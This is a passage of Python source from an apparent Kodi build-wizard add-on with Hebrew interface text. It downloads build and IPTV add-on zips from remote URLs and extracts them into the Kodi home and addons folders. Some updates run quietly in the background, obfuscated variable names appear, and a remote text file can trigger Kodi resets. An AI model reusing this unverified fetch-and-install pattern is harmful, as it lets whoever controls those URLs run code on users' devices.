	else: wiz.log("[Check Updates] ERROR: Unable to find build version in build text file", xbmc.LOGERROR)
def updatetelemedia(NOTEID):
    from startup import teleupdate
    wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]' % COLOR2)
    xbmc.executebuiltin("UpdateLocalAddons")
    xbmc.executebuiltin("UpdateAddonRepos")
    wiz.wizardUpdate('startup')

    checkUpdate()
    xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'בודק אם קיים עדכון בשבילך')))
    time.sleep(15.0)
    if ENABLE == 'Yes' and BUILDNAME == " Kodi Premium":
     if teleupdate is False:
        # input= (ADDON.getSetting("autoupdate"))
        STARTP2()
        wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]' % COLOR2)
        if not NOTIFY == 'true':
            url = wiz.workingURL(NOTIFICATION)
            if url == True:
                id, msg = wiz.splitNotify(NOTIFICATION)
                if not id == False:
                    try:
                        id = int(id); NOTEID = int(NOTEID)
                        if id == NOTEID:
                            if NOTEDISMISS == 'false':
                                debridit.debridIt('update', 'all')
                                traktit.traktIt('update', 'all')
                                checkidupdatetele()# notify.notification(msg)
                            else: wiz.log("[Notifications] id[%s] Dismissed" % int(id), xbmc.LOGNOTICE)
                        elif id > NOTEID:
                            wiz.log("[Notifications] id: %s" % str(id), xbmc.LOGNOTICE)
                            wiz.setS('noteid', str(id))
                            wiz.setS('notedismiss', 'false')
                            # if input == 'true':
                            debridit.debridIt('update', 'all')
                            traktit.traktIt('update', 'all')
                            checkidupdatetele()
                            # else: notify.notification(msg=msg)
                            wiz.log("[Notifications] Complete", xbmc.LOGNOTICE)
                    except Exception as e:
                        wiz.log("Error on Notifications Window: %s" % str(e), xbmc.LOGERROR)
                else: wiz.log("[Notifications] Text File not formated Correctly")
            else: wiz.log("[Notifications] URL(%s): %s" % (NOTIFICATION, url), xbmc.LOGNOTICE)
        else: wiz.log("[Notifications] Turned Off", xbmc.LOGNOTICE)

                        
                        
def checkidupdate():
			
				wiz.setS("notedismiss","true")
				url = wiz.workingURL(NOTIFICATION)

				name =  " Kodi Premium"
				buildzip = wiz.checkBuild(name,'gui')
				zipname = name.replace('\\', '').replace('/', '').replace(':', '').replace('*', '').replace('?', '').replace('"', '').replace('<', '').replace('>', '').replace('|', '')
				if not wiz.workingURL(buildzip) == True: return
				if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
				DP.create(ADDONTITLE,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]' % (COLOR1, name),'', 'אנא המתן')
				lib=os.path.join(PACKAGES, '%s_guisettings.zip' % zipname)
				try: os.remove(lib)
				except: pass
				logging.warning(buildzip)
				if 'google' in buildzip:
				   res=googledrive_download(buildzip, lib, DP,wiz.checkBuild(name, 'filesize'))
			
			
				else:
				  downloader.download(buildzip, lib, DP)
				xbmc.sleep(100)
				title = '[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, name)
				DP.update(0, title,'', 'אנא המתן')
				extract.all(lib,HOME,DP, title=title)
				DP.close()
				wiz.defaultSkin()
				wiz.lookandFeelData('save')
				if KODIV>=18:
					skindialogsettind18()
				# wiz.kodi17Fix()
				# xbmc.executebuiltin("ReloadSkin()")
				if INSTALLMETHOD == 1: todo = 1
				elif INSTALLMETHOD == 2: todo = 0
				else: DP.close()
def checkidupdatetele():
			
				wiz.setS("notedismiss","true")
				url = wiz.workingURL(NOTIFICATION)

				name =  " Kodi Premium"
				buildzip = wiz.checkBuild(name,'gui')
				zipname = name.replace('\\', '').replace('/', '').replace(':', '').replace('*', '').replace('?', '').replace('"', '').replace('<', '').replace('>', '').replace('|', '')
				if not wiz.workingURL(buildzip) == True: return
				if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
#				DP2.create('קיים עדכון מהיר עבורך')
#				DP2.update(0, 'מוריד')
				lib=os.path.join(PACKAGES, '%s_guisettings.zip' % zipname)
				try: os.remove(lib)
				except: pass

				if 'google' in buildzip:
				   res=googledrive_download(buildzip, lib, DP2,wiz.checkBuild(name, 'filesize'))
			
			
				else:
				  downloaderbg.download3(buildzip, lib, DP2)
				xbmc.sleep(100)
				DP2.create('[B][COLOR=green]מתקין                         [/COLOR][/B]')
#				title = '[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, name)
				DP2.update(100, message='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')

				extract.all2(lib,HOME,DP2)
				DP2.close()
				wiz.defaultSkin()
				wiz.lookandFeelData('save')
				wiz.kodi17Fix()
				if KODIV>=18:
					skindialogsettind18()
				#xbmc.executebuiltin("ReloadSkin()")
				# update_Votes()
				# indicatorfastupdate()
				# wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]' % COLOR2)
				debridit.debridIt('restore', 'all')
				traktit.traktIt('restore', 'all')
				if INSTALLMETHOD == 1: todo = 1
				elif INSTALLMETHOD == 2: todo = 0
				else: DP2.close()
				urlz = (NOTIFICATION2)
				remote_file = urllib2.urlopen(urlz)
				x=remote_file.readlines()
				found=0
	
#	if not input +'\r\n' in x:
				for us in x:
					if us.split(' ==')[0] =="noreset" or us.split()[0]=="noreset":
					# found=1
						xbmc.executebuiltin("ReloadSkin()")
						wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]' % COLOR2)
						notifyb= (ADDON.getSetting("message"))
						if notifyb == 'true':
							infobuild()
						update_Votes()
						indicatorfastupdate()
					if us.split(' ==')[0] =="reset" or us.split()[0]=="reset":
					# wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הבילד יסגר![/COLOR]' % COLOR2)
						update_Votes()
						indicatorfastupdate()
						resetkodi()
def gaiaserenaddon():
  input= (ADDON.getSetting("gaiaseren"))
  input2= (ADDON.getSetting("auto_rd"))
  if input == 'true' and input2== 'true':
    link= (NEWFASTUPDATE)
    iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
    iiiI11 = xbmcgui . DialogProgress ( )
    iiiI11 . create ( "[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]" , "[B][COLOR=yellow]מוריד....[/COLOR][/B]"  '' , 'אנא המתן' )
    OOooO = os . path . join ( PACKAGES , 'isr.zip' )
    req = urllib2.Request(link)
    remote_file = urllib2.urlopen(req)
    #the_page = response.read()
    dp = xbmcgui.DialogProgress()
    dp.create("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]", "[B][COLOR=yellow]מוריד....[/COLOR][/B]")
    dp.update(0)

    f = open(OOooO, 'wb')

    try:
      total_size = remote_file.info().getheader('Content-Length').strip()
      header = True
    except AttributeError:
          header = False # a response doesn't always include the "Content-Length" header

    if header:
          total_size = int(total_size)

    bytes_so_far = 0
    start_time=time.time()
    while True:
          buffer = remote_file.read(8192)
          if not buffer:
              sys.stdout.write('\n')
              break

          bytes_so_far += len(buffer)
          f.write(buffer)

          if not header:
              total_size = bytes_so_far # unknown size
          if dp.iscanceled(): 
             dp.close()
             try:
              os.remove(OOooO)
             except:
              pass
             break
          percent = float(bytes_so_far) / total_size
          percent = round(percent*100, 2)
          currently_downloaded=bytes_so_far/ (1024 * 1024) 
          total=total_size/ (1024 * 1024) 
          mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
          if (time.time() - start_time) >0:
            kbps_speed = bytes_so_far / (time.time() - start_time) 
            kbps_speed = kbps_speed / 1024 
          else:
           kbps_speed=0
          type_speed = 'KB'
          if kbps_speed >= 1024:
             kbps_speed = kbps_speed / 1024 
             type_speed = 'MB'
          if kbps_speed > 0 and not percent == 100: 
              eta = (total_size - bytes_so_far) / kbps_speed 
          else: 
              eta = 0
          e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

          dp.update(int(percent),mbs,e+ "[B][COLOR=yellow]מוריד.... [/COLOR][/B]"  )
          #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
  
    II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/addons' ) )

     
    f.close()
    extract.all  ( OOooO , II111iiii,dp )
  
   # extract.all(lib, HOME,DP)

    try:
      os.remove(OOooO)
    except:
      pass
def iptvsimpldownpc():

    link= (IPTVSIMPL18PC)
    iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
    iiiI11 = xbmcgui . DialogProgress ( )
    iiiI11 . create ( "[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]" , "[B][COLOR=yellow]מוריד....[/COLOR][/B]"  '' , 'אנא המתן' )
    OOooO = os . path . join ( PACKAGES , 'isr.zip' )
    req = urllib2.Request(link)
    remote_file = urllib2.urlopen(req)
    #the_page = response.read()
    dp = xbmcgui.DialogProgress()
    dp.create("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]", "[B][COLOR=yellow]מוריד....[/COLOR][/B]")
    dp.update(0)

    f = open(OOooO, 'wb')

    try:
      total_size = remote_file.info().getheader('Content-Length').strip()
      header = True
    except AttributeError:
          header = False # a response doesn't always include the "Content-Length" header

    if header:
          total_size = int(total_size)

    bytes_so_far = 0
    start_time=time.time()
    while True:
          buffer = remote_file.read(8192)
          if not buffer:
              sys.stdout.write('\n')
              break

          bytes_so_far += len(buffer)
          f.write(buffer)

          if not header:
              total_size = bytes_so_far # unknown size
          if dp.iscanceled(): 
             dp.close()
             try:
              os.remove(OOooO)
             except:
              pass
             break
          percent = float(bytes_so_far) / total_size
          percent = round(percent*100, 2)
          currently_downloaded=bytes_so_far/ (1024 * 1024) 
          total=total_size/ (1024 * 1024) 
          mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
          if (time.time() - start_time) >0:
            kbps_speed = bytes_so_far / (time.time() - start_time) 
            kbps_speed = kbps_speed / 1024 
          else:
           kbps_speed=0
          type_speed = 'KB'
          if kbps_speed >= 1024:
             kbps_speed = kbps_speed / 1024 
             type_speed = 'MB'
          if kbps_speed > 0 and not percent == 100: 
              eta = (total_size - bytes_so_far) / kbps_speed 
          else: 
              eta = 0
          e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

          dp.update(int(percent),mbs,e+ "[B][COLOR=yellow]מוריד.... [/COLOR][/B]"  )
          #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
  
    II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/addons' ) )

     
    f.close()
    extract.all  ( OOooO , II111iiii,dp )
  
   # extract.all(lib, HOME,DP)

    try:
      os.remove(OOooO)
    except:
      pass
def iptvkodi18idan(): # הרחבה בשם לוקי שאותה בודקים

      if xbmc.getCondVisibility('system.platform.windows') and KODIV>=18:
          # if not os.path.exists(os.path.join(ADDONS, 'pvr.iptvsimple')):
              
              link='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'
              iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
              iiiI11 = xbmcgui . DialogProgress ( )
              iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +'הגדרת ערוצי עידן פלוס', '' , 'Please Wait' )
              OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
              req = urllib2.Request(link)
              remote_file = urllib2.urlopen(req)
              #the_page = response.read()
              dp = xbmcgui.DialogProgress()
              dp.create("Downloading", "Downloading " +'הגדרת ערוצי עידן פלוס')
              dp.update(0)

              f = open(OOooO, 'wb')

              try:
                total_size = remote_file.info().getheader('Content-Length').strip()
                header = True
              except AttributeError:
                    header = False # a response doesn't always include the "Content-Length" header

              if header:
                    total_size = int(total_size)

              bytes_so_far = 0
              start_time=time.time()
              while True:
                    buffer = remote_file.read(8192)
                    if not buffer:
                        sys.stdout.write('\n')
                        break

                    bytes_so_far += len(buffer)
                    f.write(buffer)

                    if not header:
                        total_size = bytes_so_far # unknown size
                    if dp.iscanceled(): 
                       dp.close()
                       try:
                        os.remove(OOooO)
                       except:
                        pass
                       break
                    percent = float(bytes_so_far) / total_size
                    percent = round(percent*100, 2)
                    currently_downloaded=bytes_so_far/ (1024 * 1024) 
                    total=total_size/ (1024 * 1024) 
                    mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
                    if (time.time() - start_time) >0:
                      kbps_speed = bytes_so_far / (time.time() - start_time) 
                      kbps_speed = kbps_speed / 1024 
                    else:
                     kbps_speed=0
                    type_speed = 'KB'
                    if kbps_speed >= 1024:
                       kbps_speed = kbps_speed / 1024 
                       type_speed = 'MB'
                    if kbps_speed > 0 and not percent == 100: 
                        eta = (total_size - bytes_so_far) / kbps_speed 
                    else: 
                        eta = 0
                    e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

                    dp.update(int(percent), "Downloading " +'iptv',mbs,e )
                    #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
              
              II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/addons' ) )


              f.close()
              extract.all  ( OOooO , II111iiii,dp )


              try:
                os.remove(OOooO)

              except:
                pass
              dp.close()


      if xbmc.getCondVisibility('system.platform.android') and KODIV>=18:
          # if not os.path.exists(os.path.join(ADDONS, 'pvr.iptvsimple')):
              link='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'
              iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
              iiiI11 = xbmcgui . DialogProgress ( )
              iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +'הגדרת ערוצי עידן פלוס', '' , 'Please Wait' )
              OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
              req = urllib2.Request(link)
              remote_file = urllib2.urlopen(req)
              #the_page = response.read()
              dp = xbmcgui.DialogProgress()
              dp.create("Downloading", "Downloading " +'הגדרת ערוצי עידן פלוס')
              dp.update(0)

              f = open(OOooO, 'wb')

              try:
                total_size = remote_file.info().getheader('Content-Length').strip()
                header = True
              except AttributeError:
                    header = False # a response doesn't always include the "Content-Length" header

              if header:
                    total_size = int(total_size)

              bytes_so_far = 0
              start_time=time.time()
              while True:
                    buffer = remote_file.read(8192)
                    if not buffer:
                        sys.stdout.write('\n')
                        break

                    bytes_so_far += len(buffer)
                    f.write(buffer)

                    if not header:
                        total_size = bytes_so_far # unknown size
                    if dp.iscanceled(): 
                       dp.close()
                       try:
                        os.remove(OOooO)
                       except:
                        pass
                       break
                    percent = float(bytes_so_far) / total_size
                    percent = round(percent*100, 2)
                    currently_downloaded=bytes_so_far/ (1024 * 1024) 
                    total=total_size/ (1024 * 1024) 
                    mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
                    if (time.time() - start_time) >0:
                      kbps_speed = bytes_so_far / (time.time() - start_time) 
                      kbps_speed = kbps_speed / 1024 
                    else:
                     kbps_speed=0
                    type_speed = 'KB'
                    if kbps_speed >= 1024:
                       kbps_speed = kbps_speed / 1024 
                       type_speed = 'MB'
                    if kbps_speed > 0 and not percent == 100: 
                        eta = (total_size - bytes_so_far) / kbps_speed 
                    else: 
                        eta = 0
                    e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

                    dp.update(int(percent), "Downloading " +'iptv',mbs,e )
                    #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
              
              II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/addons' ) )


              f.close()
              extract.all  ( OOooO , II111iiii,dp )
              try:
                os.remove(OOooO)

              except:
                pass
              dp.close()
def iptvkodi17_18(): # הרחבה בשם לוקי שאותה בודקים


      if xbmc.getCondVisibility('system.platform.windows') and KODIV>=17 and KODIV<18 :
        xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')
        xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')



      if xbmc.getCondVisibility('system.platform.windows') and KODIV>=18:
          if not os.path.exists(os.path.join(ADDONS, 'pvr.iptvsimple')):
              
              link='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'
              iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
              iiiI11 = xbmcgui . DialogProgress ( )
              iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +'iptv', '' , 'Please Wait' )
              OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
              req = urllib2.Request(link)
              remote_file = urllib2.urlopen(req)
              #the_page = response.read()
              dp = xbmcgui.DialogProgress()
              dp.create("Downloading", "Downloading " +'iptv')
              dp.update(0)

              f = open(OOooO, 'wb')

              try:
                total_size = remote_file.info().getheader('Content-Length').strip()
                header = True
              except AttributeError:
                    header = False # a response doesn't always include the "Content-Length" header

              if header:
                    total_size = int(total_size)

              bytes_so_far = 0
              start_time=time.time()
              while True:
                    buffer = remote_file.read(8192)
                    if not buffer:
                        sys.stdout.write('\n')
                        break

                    bytes_so_far += len(buffer)
                    f.write(buffer)

                    if not header:
                        total_size = bytes_so_far # unknown size
                    if dp.iscanceled(): 
                       dp.close()
                       try:
                        os.remove(OOooO)
                       except:
                        pass
                       break
                    percent = float(bytes_so_far) / total_size
                    percent = round(percent*100, 2)
                    currently_downloaded=bytes_so_far/ (1024 * 1024) 
                    total=total_size/ (1024 * 1024) 
                    mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
                    if (time.time() - start_time) >0:
                      kbps_speed = bytes_so_far / (time.time() - start_time) 
                      kbps_speed = kbps_speed / 1024 
                    else:
                     kbps_speed=0
                    type_speed = 'KB'
                    if kbps_speed >= 1024:
                       kbps_speed = kbps_speed / 1024 
                       type_speed = 'MB'
                    if kbps_speed > 0 and not percent == 100: 
                        eta = (total_size - bytes_so_far) / kbps_speed 
                    else: 
                        eta = 0
                    e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

                    dp.update(int(percent), "Downloading " +'iptv',mbs,e )
                    #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
              
              II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/addons' ) )


              f.close()
              extract.all  ( OOooO , II111iiii,dp )

              wiz.kodi17Fix()

              try:
                os.remove(OOooO)

              except:
                pass
              dp.close()

              xbmc.sleep(5000)

              tttt='התקנת לקוח טלוויזיה חיה'
              wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, tttt),'[COLOR %s]הקודי יסגר כעת...[/COLOR]' % COLOR2)
              resetkodi()
          xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
      if xbmc.getCondVisibility('system.platform.android') and KODIV>=18:
          if not os.path.exists(os.path.join(ADDONS, 'pvr.iptvsimple')):
              link='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'
              iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
              iiiI11 = xbmcgui . DialogProgress ( )
              iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +'iptv', '' , 'Please Wait' )
              OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
              req = urllib2.Request(link)
              remote_file = urllib2.urlopen(req)
              #the_page = response.read()
              dp = xbmcgui.DialogProgress()
              dp.create("Downloading", "Downloading " +'iptv')
              dp.update(0)

              f = open(OOooO, 'wb')

              try:
                total_size = remote_file.info().getheader('Content-Length').strip()
                header = True
              except AttributeError:
                    header = False # a response doesn't always include the "Content-Length" header

              if header:
                    total_size = int(total_size)

              bytes_so_far = 0
              start_time=time.time()
              while True:
                    buffer = remote_file.read(8192)
                    if not buffer:
                        sys.stdout.write('\n')
                        break

                    bytes_so_far += len(buffer)
                    f.write(buffer)

                    if not header:
                        total_size = bytes_so_far # unknown size
                    if dp.iscanceled(): 
                       dp.close()
                       try:
                        os.remove(OOooO)
                       except:
                        pass
                       break
                    percent = float(bytes_so_far) / total_size
                    percent = round(percent*100, 2)
                    currently_downloaded=bytes_so_far/ (1024 * 1024) 
                    total=total_size/ (1024 * 1024) 
                    mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
                    if (time.time() - start_time) >0:
                      kbps_speed = bytes_so_far / (time.time() - start_time) 
                      kbps_speed = kbps_speed / 1024 
                    else:
                     kbps_speed=0
                    type_speed = 'KB'
                    if kbps_speed >= 1024:
                       kbps_speed = kbps_speed / 1024 
                       type_speed = 'MB'
                    if kbps_speed > 0 and not percent == 100: 
                        eta = (total_size - bytes_so_far) / kbps_speed 
                    else: 
                        eta = 0
                    e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

                    dp.update(int(percent), "Downloading " +'iptv',mbs,e )
                    #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
              
              II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/addons' ) )


              f.close()
              extract.all  ( OOooO , II111iiii,dp )
              wiz.kodi17Fix()

              try:
                os.remove(OOooO)

              except:
                pass
              dp.close()

              xbmc.sleep(5000)

              tttt='התקנת לקוח טלוויזיה חיה'
              wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, tttt),'[COLOR %s]הקודי יסגר כעת...[/COLOR]' % COLOR2)
              resetkodi()

          xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
      if xbmc.getCondVisibility('system.platform.android')and KODIV<=18 and KODIV>=17 :
       xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')
       xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
def iptvidanplus():
    Addon = xbmcaddon.Addon('plugin.video.idanplus')
    Addon.setSetting('useIPTV','true')
    xbmc.executebuiltin("RunPlugin(plugin://plugin.video.idanplus/?mode=7)" )

    
    if KODIV>=17 and KODIV<18 :

        link= 'https://github.com/vip200/victory/blob/master/idanplus17.zip?raw=true'
        iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
        iiiI11 = xbmcgui . DialogProgress ( )
        iiiI11 . create ( "[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]" , "[B][COLOR=yellow]מוריד....[/COLOR][/B]"  '' , 'אנא המתן' )
        OOooO = os . path . join ( PACKAGES , 'isr.zip' )
        req = urllib2.Request(link)
        remote_file = urllib2.urlopen(req)
        #the_page = response.read()
        dp = xbmcgui.DialogProgress()
        dp.create("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]", "[B][COLOR=yellow]מוריד....[/COLOR][/B]")
        dp.update(0)

        f = open(OOooO, 'wb')

        try:
          total_size = remote_file.info().getheader('Content-Length').strip()
          header = True
        except AttributeError:
              header = False # a response doesn't always include the "Content-Length" header

        if header:
              total_size = int(total_size)

        bytes_so_far = 0
        start_time=time.time()
        while True:
              buffer = remote_file.read(8192)
              if not buffer:
                  sys.stdout.write('\n')
                  break

              bytes_so_far += len(buffer)
              f.write(buffer)

              if not header:
                  total_size = bytes_so_far # unknown size
              if dp.iscanceled(): 
                 dp.close()
                 try:
                  os.remove(OOooO)
                 except:
                  pass
                 break
              percent = float(bytes_so_far) / total_size
              percent = round(percent*100, 2)
              currently_downloaded=bytes_so_far/ (1024 * 1024) 
              total=total_size/ (1024 * 1024) 
              mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
              if (time.time() - start_time) >0:
                kbps_speed = bytes_so_far / (time.time() - start_time) 
                kbps_speed = kbps_speed / 1024 
              else:
               kbps_speed=0
              type_speed = 'KB'
              if kbps_speed >= 1024:
                 kbps_speed = kbps_speed / 1024 
                 type_speed = 'MB'
              if kbps_speed > 0 and not percent == 100: 
                  eta = (total_size - bytes_so_far) / kbps_speed 
              else: 
                  eta = 0
              e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

              dp.update(int(percent),mbs,e+ "[B][COLOR=yellow]מוריד.... [/COLOR][/B]"  )
              #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
      
        II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/' ) )

         
        f.close()
        extract.all  ( OOooO , II111iiii,dp )
      
       # extract.all(lib, HOME,DP)

        try:
          os.remove(OOooO)
        except:
          pass
        wiz.kodi17Fix()
        xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')
        time.sleep(10)
        Addoniptv = xbmcaddon.Addon('pvr.iptvsimple')
        Addoniptv.setSetting('epgTimeShift','1.000000')
        Addoniptv.setSetting('m3uPathType','0')
        Addoniptv.setSetting('epgPathType','0')
        Addoniptv.setSetting('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')
        Addoniptv.setSetting('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')
        wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'הגדרת ערוצי עידן פלוס'),'[COLOR %s]הושלם בהצלחה[/COLOR]' % COLOR2)
        resetkodi()


    if KODIV>=18: 
      # if not os.path.exists(os.path.join(ADDONS, 'pvr.iptvsimple')):
        iptvkodi18idan()
        wiz.kodi17Fix()
        
        time.sleep(10)
        Addoniptv = xbmcaddon.Addon('pvr.iptvsimple')
        Addoniptv.setSetting('epgTimeShift','1.000000')
        Addoniptv.setSetting('m3uPathType','0')
        Addoniptv.setSetting('epgPathType','0')
        Addoniptv.setSetting('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')
        Addoniptv.setSetting('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus3.m3u')
        tttt='הגדרת ערוצי עידן פלוס'
        wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, tttt),'[COLOR %s]הקודי יסגר כעת...[/COLOR]' % COLOR2)
        resetkodi()
        
    # wiz.kodi17Fix()
    # time.sleep(10)
    # Addoniptv = xbmcaddon.Addon('pvr.iptvsimple')
    # Addoniptv.setSetting('epgTimeShift','1.000000')
    # Addoniptv.setSetting('m3uPathType','0')
    # Addoniptv.setSetting('epgPathType','0')
    # Addoniptv.setSetting('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')
    # if KODIV>=18: 
     # Addoniptv.setSetting('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus3.m3u')
    # if KODIV>=17 and KODIV<18 :
     # Addoniptv.setSetting('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')
    # tttt='הגדרת ערוצי עידן פלוס'
    # wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, tttt),'[COLOR %s]הקודי יסגר כעת...[/COLOR]' % COLOR2)
    # resetkodi()
def iptvsimpldown():

    link= (IPTV18)
    iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
    iiiI11 = xbmcgui . DialogProgress ( )
    iiiI11 . create ( "[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]" , "[B][COLOR=yellow]מוריד....[/COLOR][/B]"  '' , 'אנא המתן' )
    OOooO = os . path . join ( PACKAGES , 'isr.zip' )
    req = urllib2.Request(link)
    remote_file = urllib2.urlopen(req)
    #the_page = response.read()
    dp = xbmcgui.DialogProgress()
    dp.create("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]", "[B][COLOR=yellow]מוריד....[/COLOR][/B]")
    dp.update(0)

    f = open(OOooO, 'wb')

    try:
      total_size = remote_file.info().getheader('Content-Length').strip()
      header = True
    except AttributeError:
          header = False # a response doesn't always include the "Content-Length" header
